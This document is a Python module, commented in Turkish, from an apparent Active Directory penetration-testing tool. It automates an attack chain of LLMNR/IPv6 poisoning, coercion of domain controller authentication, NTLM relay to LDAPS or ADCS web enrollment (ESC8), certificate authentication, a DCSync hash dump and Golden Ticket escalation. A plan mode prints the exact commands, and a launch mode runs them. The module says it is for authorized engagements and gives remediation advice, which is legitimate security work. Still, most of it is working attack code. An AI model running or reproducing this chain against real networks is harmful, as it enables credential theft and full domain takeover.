"""Aktif ağ saldırıları: poisoning + NTLM relay + ESC8 (opt-in, ÇOK AKTİF).

Bu modül BAŞKA kullanıcıların/sistemlerin kimlik doğrulamasını yakalar ve
başka hizmetlere relay eder. Yalnızca YAZILI test izni olan, kontrollü lab/engagement
ortamlarında kullanın. Üretim ağında çalıştırmak hizmet kesintisine ve yasal
sonuçlara yol açabilir.

Varsayılan: PLAN modu — zinciri ve tam komutları gösterir, hiçbir şey çalıştırmaz.
`--launch` verildiğinde (ve --active-attacks onayı alındığında) poisoner'ı arka
planda başlatıp relay dinleyicisini bir yakalama penceresi boyunca çalıştırır.

Modellenen zincir:
  IPv6/LLMNR poisoning  ->  NTLM yakalama  ->  relay (LDAPS/HTTP)
  ->  ESC8 (ADCS web enrollment)  ->  makine/DC sertifikası  ->  DA
"""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
import time

from .. import config
from ..findings import Credential, Finding, ScanReport, Severity
from ..registry import ScanContext, ScanModule
from ..runner import CommandResult, resolve_impacket, run, which


def _nrx() -> str:
    return resolve_impacket("ntlmrelayx.py") or "ntlmrelayx.py"


def _secretsdump() -> str:
    return resolve_impacket("secretsdump.py") or "secretsdump.py"
from ..util import grep as _grep

# coerce_plus'ın desteklediği zorlama yöntemleri (nxc -M coerce_plus -o METHOD=...)
COERCE_METHODS = ("PetitPotam", "DFSCoerce", "ShadowCoerce", "PrinterBug", "MSEven")


def _certbin() -> str:
    """Kurulu certipy adını döndürür (certipy-ad / certipy)."""
    return "certipy-ad" if which("certipy-ad") else "certipy"


def _creds_argv(ctx: ScanContext) -> list[str]:
    """coerce_plus kimlik argümanları (nxc: -u <user> -d <domain> -p/-H)."""
    argv: list[str] = []
    if ctx.username:
        argv += ["-u", ctx.username]
        if ctx.domain:
            argv += ["-d", ctx.domain]
        if ctx.nthash:
            argv += ["-H", ctx.nthash]
        elif ctx.password is not None:
            argv += ["-p", ctx.password]
    return argv


def _coerce_argv(ctx: ScanContext, dc: str, listener: str, method: str = "All") -> list[str]:
    """DC'yi `listener`'a kimlik doğrulamaya ZORLAYAN coerce_plus komutu."""
    from . import nxc_scan  # yerel import: döngüsel import'u önler
    return ([nxc_scan.tool().name, "smb", dc] + _creds_argv(ctx)
            + ["-M", "coerce_plus", "-o", f"LISTENER={listener}", f"METHOD={method}"])


def _read_log(tmp) -> str:
    """Arka plan sürecinin log tempfile'ını okur ve temizler."""
    try:
        tmp.flush()
    except Exception:  # noqa: BLE001
        pass
    data = ""
    try:
        with open(tmp.name, encoding="utf-8", errors="replace") as fh:
            data = fh.read()
    except OSError:
        pass
    try:
        tmp.close()
        os.unlink(tmp.name)
    except OSError:
        pass
    return data


def build_plan(ctx: ScanContext) -> list[tuple[str, list[str]]]:
    """Saldırı zincirinin adım adım komut planını üretir (coerce -> relay -> DA)."""
    dc = ctx.target.split(",")[0].split("/")[0].strip()
    domain = ctx.domain or "<domain>"
    iface = ctx.interface or "<iface>"
    ca = ctx.adcs_ca_url or "http://<CA>/certsrv/certfnsh.asp"
    targets = ctx.relay_targets or f"ldaps://{dc}"
    listener = ctx.listener_ip or "<sizin_ip>"
    cert_bin = "certipy-ad" if which("certipy-ad") else "certipy"

    plan: list[tuple[str, list[str]]] = []

    # 1) Relay dinleyici — ADCS URL verildiyse ESC8, değilse LDAPS (önce başlatılır)
    if ctx.adcs_ca_url:
        plan.append(("ntlmrelayx: ESC8 ADCS web enrollment relay -> makine/DC sertifikası",
                     [_nrx(), "-t", ca, "-smb2support", "--adcs",
                      "--template", "DomainController"]))
    elif not ctx.relay_targets:
        # Hedef belirtilmediyse DC'nin kendisine LDAPS relay -> shadow credentials:
        # channel binding=Never'da (bkz. nxc bulgusu) coerced DC$ auth'u ldaps://DC'ye
        # relay edilir, DC$'a KeyCredential eklenir -> PKINIT -> DC$ hash -> DCSync.
        plan.append(("ntlmrelayx: SMB/coerce -> LDAPS relay + shadow-credentials (DC$ -> DA)",
                     ["ntlmrelayx.py", "-t", f"ldaps://{dc}", "--shadow-credentials",
                      "--shadow-target", "'DC$'", "-smb2support"]))
    else:
        plan.append(("ntlmrelayx: SMB -> LDAPS relay (RBCD/delegasyon)",
                     [_nrx(), "-6", "-t", targets, "-wh", f"fakewpad.{domain}",
                      "-l", "loot", "--delegate-access", "-smb2support"]))

    # 2) ZORLAMA (coercion): DC'yi dinleyiciye kimlik doğrulamaya zorla (OTOMATİK tetik)
    plan.append(("coerce_plus: DC'yi dinleyiciye auth'a ZORLA "
                 "(PetitPotam/DFSCoerce/ShadowCoerce/PrinterBug/MS-EVEN)",
                 _coerce_argv(ctx, dc, listener)))

    # 3) (Alternatif/ek tetik) poisoning — coercion yoksa veya ek yüzey için
    if ctx.interface or not ctx.listener_ip:
        poison = (["mitm6", "-d", domain, "-i", iface] if (domain != "<domain>"
                  and which("mitm6")) else ["responder", "-I", iface, "-v"])
        plan.append(("(alternatif tetik) poisoning: mitm6/responder", poison))

    # 4) Sertifika ile kimlik doğrulama -> NT hash / TGT (ESC8 yolu)
    plan.append((f"{cert_bin}: alınan sertifikayla auth -> TGT/NT hash",
                 [cert_bin, "auth", "-pfx", f"{dc}.pfx", "-dc-ip", dc]))

    # 5) DCSync / secretsdump -> Domain Admin / krbtgt
    plan.append(("secretsdump: DCSync (sertifika/hash ile) -> krbtgt (DA)",
                 [_secretsdump(), f"{domain}/'DC$'@{dc}", "-just-dc"]))
    return plan


def _plan_result(ctx: ScanContext) -> CommandResult:
    plan = build_plan(ctx)
    lines = ["[PLAN] Aktif saldırı zinciri (çalıştırılmadı):"]
    for i, (label, argv) in enumerate(plan, 1):
        lines.append(f"  {i}. {label}")
        lines.append(f"       $ {' '.join(argv)}")
    lines.append("")
    lines.append("OTOMATİK (adscan dinleyiciyi başlatır, DC'yi coerce_plus ile zorlar, "
                 "yakalar):")
    dc = ctx.target.split(",")[0].split("/")[0].strip()
    one = (f"  adscan {dc} --active-attacks --launch --listener-ip <sizin_ip> "
           f"-d {ctx.domain or '<domain>'} -u <user> -p <pass>")
    if ctx.adcs_ca_url:
        one += f" --adcs-ca-url {ctx.adcs_ca_url}"
    else:
        one += " --adcs-ca-url http://<CA>/certsrv/certfnsh.asp   # ESC8 için"
    lines.append(one)
    return CommandResult(tool="relay:plan", argv=[], returncode=0,
                         stdout="\n".join(lines), stderr="", duration=0.0)


def _launch_chain(ctx: ScanContext) -> list[CommandResult]:
    """Relay dinleyiciyi arka planda başlatır, DC'yi OTOMATİK coerce_plus ile zorlar
    (listener-ip verildiyse) ve/veya poisoning tetikler; yakalama penceresi boyunca
    relay'in auth'u yakalayıp eyleme (ESC8/RBCD/DCSync) dönüştürmesini bekler."""
    results: list[CommandResult] = []
    domain = ctx.domain or ""
    iface = ctx.interface
    dc = ctx.target.split(",")[0].split("/")[0].strip()
    listener = ctx.listener_ip

    # Relay hedefi: ADCS URL -> ESC8; değilse LDAPS (RBCD/delegasyon)
    if ctx.adcs_ca_url:
        relay_argv = [_nrx(), "-t", ctx.adcs_ca_url, "-smb2support",
                      "--adcs", "--template", "DomainController"]
    elif not ctx.relay_targets:
        # DC'ye LDAPS relay + shadow-credentials (channel binding=Never yolu)
        relay_argv = [_nrx(), "-t", f"ldaps://{dc}", "--shadow-credentials",
                      "--shadow-target", "DC$", "-smb2support"]
    else:
        relay_argv = [_nrx(), "-6", "-t", ctx.relay_targets,
                      "-wh", f"fakewpad.{domain}", "-l", "loot",
                      "--delegate-access", "-smb2support"]

    # Tetikleyiciler: aktif coercion (listener IP gerekir) + opsiyonel poisoning (iface)
    coerce_argv = _coerce_argv(ctx, dc, listener) if listener else None
    poison_argv = None
    if iface:
        if domain and which("mitm6"):
            poison_argv = ["mitm6", "-d", domain, "-i", iface]
        elif which("responder"):
            poison_argv = ["responder", "-I", iface, "-v"]

    if not coerce_argv and not poison_argv:
        return [CommandResult(
            tool="relay:error", argv=[], returncode=None, stdout="", stderr="",
            duration=0.0,
            error="Tetikleyici yok: coercion için --listener-ip <sizin_ip> (ve -u/-p), "
                  "poisoning için -I <iface> verin")]

    # Araç mevcudiyet kontrolü (varolan tetikleyiciler + relay)
    for argv in filter(None, [relay_argv, coerce_argv, poison_argv]):
        if which(argv[0]) is None:
            return [CommandResult(
                tool="relay:error", argv=argv, returncode=None, stdout="",
                stderr="", duration=0.0, error=f"'{argv[0]}' PATH'te bulunamadı")]

    start = time.time()
    relay_log = tempfile.NamedTemporaryFile("w+", suffix="-relay.log", delete=False)
    poison_log = None
    relay_proc = None
    poison_proc = None
    try:
        # 1) Relay dinleyiciyi arka planda başlat
        relay_proc = subprocess.Popen(relay_argv, stdout=relay_log,
                                      stderr=subprocess.STDOUT, text=True)
        time.sleep(3)  # dinleyici ayağa kalksın
        # 2) Opsiyonel poisoning tetikleyici
        if poison_argv:
            poison_log = tempfile.NamedTemporaryFile("w+", suffix="-poison.log", delete=False)
            poison_proc = subprocess.Popen(poison_argv, stdout=poison_log,
                                           stderr=subprocess.STDOUT, text=True)
            time.sleep(2)
        # 3) OTOMATİK ZORLAMA: DC'yi dinleyiciye auth'a zorla (relay bunu yakalar)
        if coerce_argv:
            cres = run(coerce_argv, tool="relay:coerce",
                       timeout=min(180, max(60, ctx.capture_seconds)))
            results.append(cres)
        # 4) Yakalama penceresi: relay'in auth'u eyleme dönüştürmesini bekle
        deadline = start + ctx.capture_seconds
        while time.time() < deadline and relay_proc.poll() is None:
            time.sleep(1)
    except Exception as exc:  # noqa: BLE001
        results.append(CommandResult(tool="relay:error", argv=relay_argv,
                                     returncode=None, stdout="", stderr="",
                                     duration=time.time() - start, error=str(exc)))
    finally:
        for proc in (poison_proc, relay_proc):
            if proc is not None and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:  # noqa: BLE001
                    proc.kill()
        results.append(CommandResult(
            tool="relay:ntlmrelayx", argv=relay_argv,
            returncode=relay_proc.returncode if relay_proc else None,
            stdout=_read_log(relay_log), stderr="", duration=time.time() - start))
        if poison_log is not None:
            results.append(CommandResult(
                tool="relay:poisoner", argv=poison_argv,
                returncode=poison_proc.returncode if poison_proc else None,
                stdout=_read_log(poison_log), stderr="", duration=time.time() - start))
    return results


def _run(ctx: ScanContext) -> list[CommandResult]:
    # Onay yoksa ya da launch istenmemişse: sadece plan
    if ctx.dry_run or not ctx.active_attacks or not ctx.launch:
        return [_plan_result(ctx)]
    return _launch_chain(ctx)


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["relay"] = "\n\n".join(r.combined for r in results)
    combined = "\n\n".join(r.combined for r in results)
    target = report.target

    # Plan modu: zinciri bilgilendirici bulgu olarak ekle
    plan = next((r for r in results if r.tool == "relay:plan"), None)
    if plan is not None:
        report.add(Finding(
            title="Aktif saldırı zinciri planı (çalıştırılmadı)",
            severity=Severity.INFO, target=target, source="relay",
            description="Poisoning -> NTLM relay -> ESC8 -> Domain Admin zinciri için "
                        "komut planı. Çalıştırmak için --active-attacks --launch gerekir.",
            evidence=plan.stdout.strip(),
            reference="NTLM Relay / mitm6 / ADCS ESC8"))
        return

    # Hata sonuçları
    for r in results:
        if r.tool == "relay:error" and r.error:
            report.add_error(f"relay: {r.error}")

    # Otomatik coercion tetiklendi mi? (coerce_plus çıktısı)
    coerce_res = next((r for r in results if r.tool == "relay:coerce"), None)
    if coerce_res is not None and coerce_res.ok:
        ctext = coerce_res.combined
        triggered = sorted({m for m in re.findall(
            r"petitpotam|dfscoerce|shadowcoerce|printerbug|ms-?even", ctext, re.IGNORECASE)},
            key=str.lower)
        if re.search(r"success|coerc|authenticat|triggered|\bsmbd\b", ctext, re.IGNORECASE):
            report.add(Finding(
                title="Coercion TETİKLENDİ — DC dinleyiciye kimlik doğrulamaya zorlandı"
                      + (f" [{', '.join(m.lower() for m in triggered)}]" if triggered else ""),
                severity=Severity.CRITICAL, target=target, source="relay",
                description="coerce_plus ile DC (makine hesabı) dinleyiciye NTLM kimlik "
                            "doğrulamaya zorlandı; yakalanan auth relay edildi (ESC8/LDAP).",
                evidence=_grep(ctext, r"petitpotam|dfscoerce|shadowcoerce|printerbug|"
                                      r"ms-?even|success|coerc|authenticat", context=0),
                remediation="İlgili RPC servislerini (MS-EFSR/MS-DFSNM/MS-FSRVP/spooler/MS-EVEN) "
                            "kısıtlayın; EPA + SMB/LDAP signing zorunlu kılın; yamaları uygulayın.",
                reference="Coercion (coerce_plus) -> NTLM Relay", mitre="T1187",
                poc=f"nxc smb {target} -u <user> -p <pass> -M coerce_plus "
                    "-o LISTENER=<sizin_ip> METHOD=All"))

    # Yakalanan NetNTLM hash'leri
    if _grep(combined, r"\[.\]\s+(SMBD|HTTPD).*authenticate|Hash|NTLMv2"):
        report.add(Finding(
            title="Poisoning ile NetNTLM kimlik doğrulama(ları) yakalandı",
            severity=Severity.HIGH, target=target, source="relay",
            description="LLMNR/NBT-NS/IPv6 zehirlemesi ile kullanıcı/makine kimlik "
                        "doğrulaması ele geçirildi (çevrimdışı kırma veya relay).",
            evidence=_grep(combined, r"authenticat|NTLMv2|Hash", context=0),
            remediation="LLMNR/NBT-NS/mDNS kapatın, IPv6 (RA) filtreleyin, SMB/LDAP signing "
                        "+ channel binding zorunlu kılın.",
            reference="LLMNR/NBT-NS Poisoning",
            poc="responder -I <iface> -v   # Responder loglarında NetNTLMv2 hash'leri",
            escalation="Çevrimdışı kır: 'hashcat -m 5600 hashes.txt rockyou.txt'; ya da "
                       "signing kapalı hedefe doğrudan relay et (ntlmrelayx)."))

    # Başarılı relay (hedefte kimlik doğrulandı)
    if _grep(combined, r"SUCCEED|Authenticating against.*SUCCEED|Target system bootkey"):
        report.add(Finding(
            title="NTLM relay BAŞARILI — hedef hizmette oturum",
            severity=Severity.CRITICAL, target=target, source="relay",
            description="Yakalanan kimlik başka bir hizmete relay edilerek yetkili erişim sağlandı.",
            evidence=_grep(combined, r"SUCCEED|relayed|Authenticating against", context=0),
            remediation="SMB/LDAP signing + EPA (channel binding) zorunlu; relay yüzeyini kapatın.",
            reference="NTLM Relay",
            poc="ntlmrelayx.py -t ldaps://<dc> --delegate-access -smb2support",
            escalation="LDAPS relay -> RBCD kur (S4U) veya --escalate-user ile ACL suistimali; "
                       "SMB relay + admin -> secretsdump -> DA."))

    # ESC8 — ADCS sertifikası alındı
    if _grep(combined, r"Base64 certificate|GOT CERTIFICATE|certfnsh|\.pfx"):
        report.add(Finding(
            title="ADCS ESC8 — DC/makine sertifikası elde edildi",
            severity=Severity.CRITICAL, target=target, source="relay",
            description="Web enrollment'a relay ile DC sertifikası alındı; bununla TGT ve "
                        "DCSync (Domain Admin) mümkün.",
            evidence=_grep(combined, r"certificate|certfnsh|pfx", context=0),
            remediation="ADCS web enrollment'ta EPA + HTTPS zorunlu; HTTP enrollment kapat; "
                        "savunmasız şablonları sertleştir.",
            reference="ADCS ESC8",
            poc=("# 1) dinleyici:  ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp "
                 "-smb2support --adcs --template DomainController\n"
                 f"# 2) zorla:     nxc smb {target} -u <user> -p <pass> -M coerce_plus "
                 "-o LISTENER=<sizin_ip> METHOD=All\n"
                 f"# 3) sertifika: {_certbin()} auth -pfx {target}.pfx -dc-ip {target}"),
            escalation=(f"Sertifikayla TGT/NT hash al: '{_certbin()} auth -pfx {target}.pfx "
                        f"-dc-ip {target}' -> 'secretsdump.py <domain>/\"DC$\"@{target} "
                        "-just-dc' (DCSync, DA). Tümü otomatik: 'adscan "
                        f"{target} --active-attacks --launch --listener-ip <sizin_ip> "
                        "--adcs-ca-url http://<CA>/certsrv/certfnsh.asp -u <user> -p <pass>'.")))

    # DCSync / secret dump
    if _grep(combined, r":::|krbtgt:|Dumping Domain Credentials|aad3b435"):
        # secretsdump satırları: user:rid:lmhash:nthash:::
        dumped = _grep(combined, r"^[^\s:]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::",
                       limit=200)
        for ln in dumped.splitlines():
            parts = ln.split(":")
            if len(parts) >= 4:
                report.add_credential(Credential(
                    username=parts[0], secret=parts[3], kind="nthash",
                    source="relay", host=target))
        if config.REDACT:
            evidence = "(hash'ler --redact ile gizlendi)"
        else:
            evidence = dumped or _grep(combined, r":::|krbtgt", context=0)
        report.add(Finding(
            title="Domain kimlik bilgileri (hash) dökümü — olası Domain Admin",
            severity=Severity.CRITICAL, target=target, source="relay",
            description="DCSync/secretsdump ile domain hash'leri (krbtgt dahil) elde edildi.",
            evidence=evidence,
            remediation="Ele geçirmeyi müdahale sürecine alın; krbtgt'yi iki kez sıfırlayın.",
            reference="DCSync",
            poc=f"secretsdump.py <domain>/<user>@{target} -just-dc   "
                f"# ya da: nxc smb {target} -u <admin> -H <nthash> --ntds",
            escalation="krbtgt hash'i ile Golden Ticket: 'ticketer.py -nthash <krbtgt_nt> "
                       "-domain-sid <SID> -domain <domain> Administrator' -> kalıcı DA; tüm "
                       "hesapların hash'leri pass-the-hash için kullanılabilir."))


MODULE = ScanModule(
    name="relay",
    label="aktif poisoning/relay/ESC8 zinciri (opt-in, varsayılan PLAN)",
    run=_run,
    parse=parse,
    optin=True,
    active=True,
)
